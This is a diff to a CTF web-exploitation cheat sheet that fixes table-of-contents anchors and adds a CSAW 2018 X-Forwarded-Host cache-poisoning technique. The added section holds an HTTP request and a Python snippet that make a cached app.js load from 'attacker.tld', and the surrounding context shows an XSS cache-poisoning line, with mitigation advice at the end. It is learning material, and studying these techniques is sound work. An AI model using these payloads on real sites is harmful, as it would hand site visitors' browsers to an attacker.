@@ -10,25 +10,26 @@
 - [JavaScript String Replace Exploitation](#javascript-string-replace-exploitation)
 - [Client-Side Path Traversal (CSPT)](#client-side-path-traversal-cspt)
 - [Cache Poisoning](#cache-poisoning)
+  - [X-Forwarded-Host CDN Template Fetch Poisoning (CSAW 2018)](#x-forwarded-host-cdn-template-fetch-poisoning-csaw-2018)
 - [Hidden DOM Elements](#hidden-dom-elements)
 - [React-Controlled Input Programmatic Filling](#react-controlled-input-programmatic-filling)
-- [Magic Link + Redirect Chain XSS](#magic-link-redirect-chain-xss)
+- [Magic Link + Redirect Chain XSS](#magic-link--redirect-chain-xss)
 - [Content-Type via File Extension](#content-type-via-file-extension)
 - [DOM XSS via jQuery Hashchange (Crypto-Cat)](#dom-xss-via-jquery-hashchange-crypto-cat)
 - [Shadow DOM XSS](#shadow-dom-xss)
-- [DOM Clobbering + MIME Mismatch](#dom-clobbering-mime-mismatch)
+- [DOM Clobbering + MIME Mismatch](#dom-clobbering--mime-mismatch)
 - [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
 - [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
 - [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
 - [JSFuck Decoding](#jsfuck-decoding)
 - [AngularJS 1.x Sandbox Escape via charAt/trim Override (Google CTF 2017)](#angularjs-1x-sandbox-escape-via-charattrim-override-google-ctf-2017)
 - [Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)](#admin-bot-javascript-url-scheme-bypass-dicectf-2026)
-- [XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)](#xs-leak-via-image-load-timing-graphql-csrf-htb-grandmonty)
+- [XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)](#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty)
   - [Why it works](#why-it-works)
-  - [Step 1 — Redirect bot via meta refresh (CSP bypass)](#step-1-redirect-bot-via-meta-refresh-csp-bypass)
-  - [Step 2 — Timing oracle via image loads](#step-2-timing-oracle-via-image-loads)
-  - [Step 3 — Character-by-character extraction](#step-3-character-by-character-extraction)
-  - [Step 4 — Host exploit and tunnel](#step-4-host-exploit-and-tunnel)
+  - [Step 1 — Redirect bot via meta refresh (CSP bypass)](#step-1--redirect-bot-via-meta-refresh-csp-bypass)
+  - [Step 2 — Timing oracle via image loads](#step-2--timing-oracle-via-image-loads)
+  - [Step 3 — Character-by-character extraction](#step-3--character-by-character-extraction)
+  - [Step 4 — Host exploit and tunnel](#step-4--host-exploit-and-tunnel)
 
 ---
 
@@ -97,6 +98,28 @@ CDN/cache keys only on URL:
 requests.get(f"{TARGET}/search?query=harmless", data=f"query=<script>evil()</script>")
 # All visitors to /search?query=harmless get XSS
 ```
+
+### X-Forwarded-Host CDN Template Fetch Poisoning (CSAW 2018)
+
+**Pattern:** A CDN fronting the app keys cached responses only on path + query. A backend Mustache template renders a `<script src="https://{{host}}/cdn/app.js">` tag where `{{host}}` comes from the `X-Forwarded-Host` header. The attacker sends one request with `X-Forwarded-Host: attacker.tld`, Varnish caches the response for 120 seconds, and every subsequent visitor loads JavaScript from the attacker origin.
+
+```http
+GET /cdn/app.js HTTP/1.1
+Host: target.tld
+X-Forwarded-Host: attacker.tld
+```
+
+```python
+import requests, time
+# Poison the cache
+requests.get("https://target.tld/cdn/app.js",
+             headers={"X-Forwarded-Host": "attacker.tld"})
+# Within the 120s TTL any visitor pulls https://attacker.tld/cdn/app.js
+```
+
+**Key insight:** Cache keys rarely include request headers, even when those headers feed the response body. Any header the backend reflects into HTML (`Host`, `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`) becomes a web cache poisoning vector the moment the response is cached. Use `Vary: X-Forwarded-Host` or strip these headers at the edge; attackers hunt them with Burp Param Miner (`unkeyed header discovery`).
+
+**References:** CSAW CTF Qualification Round 2018 — Hacker Movie Club, writeup 11277
 
 ---
 
